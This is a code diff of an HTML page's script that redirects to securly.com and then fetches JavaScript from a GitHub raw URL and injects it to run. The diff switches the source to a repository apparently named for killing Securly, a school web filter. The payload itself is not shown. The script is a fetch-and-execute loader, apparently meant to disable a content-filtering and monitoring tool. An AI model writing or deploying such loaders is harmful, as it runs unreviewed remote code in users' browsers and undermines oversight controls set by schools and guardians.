@@ -8,28 +8,26 @@
         // Wait for the page to load
         window.addEventListener('load', () => {
             const redirectUrl = 'https://securly.com';
-            const scriptUrl = 'https://raw.githubusercontent.com/Dy1ngRat/pupet/refs/heads/main/action.js';
+            const scriptUrl = 'https://raw.githubusercontent.com/zek-c/Securly-Kill-V111/main/kill.js';
 
             // Redirect to the new URL
             window.location.href = redirectUrl;
 
             // Listen for the 'pageshow' event after redirection
             window.addEventListener('pageshow', () => {
-                
-            fetch(scriptUrl)
-                .then(response => response.text())
-                .then(scriptContent => {
-                    window.stop();
-                    const scriptElement = document.createElement('script');
-                    scriptElement.textContent = scriptContent;
-                    document.body.appendChild(scriptElement);
+                fetch(scriptUrl)
+                    .then(response => response.text())
+                    .then(scriptContent => {
+                        const scriptElement = document.createElement('script');
+                        scriptElement.textContent = scriptContent;
+                        document.body.appendChild(scriptElement);
 
-                    console.log('Script executed.');
+                        console.log('Script executed.');
 
-                    // Stop page loading after script execution
-                    //window.stop();
-                })
-                .catch(err => console.error('Error fetching script:', err));      
+                        // Stop page loading after script execution
+                        window.stop();
+                    })
+                    .catch(err => console.error('Error fetching script:', err));
             });
         });
     </script>
